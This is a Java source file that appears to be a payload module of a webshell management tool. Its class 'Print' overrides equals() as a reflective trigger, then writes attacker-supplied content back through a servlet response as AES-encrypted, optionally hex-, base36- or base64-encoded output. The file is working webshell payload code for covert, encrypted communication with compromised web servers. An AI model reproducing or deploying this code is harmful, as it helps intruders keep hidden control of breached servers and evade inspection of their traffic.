package org.b1ackc4t.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.util.*;

public class Print {
   public static String content;
   private Object Response;
   public static String key;
   public static int encode;

   public boolean equals(Object obj) {
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      Object o;
      Method m;
      try {
         fill(obj);
         bos.write("1@".getBytes());
         bos.write(content.getBytes());
      } catch (Exception e) {
         e.printStackTrace();
         try {
            bos.reset();
            bos.write("0@".getBytes());
         } catch (Exception r) {
            r.printStackTrace();
         }
      }

      try {
         o = Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         m = o.getClass().getMethod("write", byte[].class);
         byte[] r = encrypt(bos.toByteArray());
         switch (encode) {
            case 0:
               break;
            case 1:
               r = new BigInteger(r).toString(16).getBytes();
               break;
            case 2:
               r = new BigInteger(r).toString(36).getBytes();
               break;
            default:
               if (System.getProperty("java.version").compareTo("1.8") >= 0) {
                  r = Base64.getEncoder().encode(r);
               } else {
                  r = new sun.misc.BASE64Encoder().encode(r).getBytes();
               }
         }
         m.invoke(o, r);
         o.getClass().getMethod("flush").invoke(o);
         o.getClass().getMethod("close").invoke(o);
//            Response.getOutputStream().write(this.Encrypt(bos.toByteArray()));
//            Response.getOutputStream().flush();
//            Response.getOutputStream().close();
      } catch (Exception e) {
         e.printStackTrace();
      }
      try {
         bos.close();
      } catch (Exception e) {
         e.printStackTrace();
      }
      return true;
   }

   private byte[] encrypt(byte[] bs) throws Exception {
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, new SecretKeySpec(key.getBytes("utf-8"), "AES"));
      return cipher.doFinal(bs);
   }

   private void fill(Object obj) throws Exception {
      List<Object> myContext = (List)obj;
      Response = myContext.get(0);
      if (myContext.size() > 1) {
         content = (String) myContext.get(1);
      }
      Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(Response, "UTF-8");
   }
}
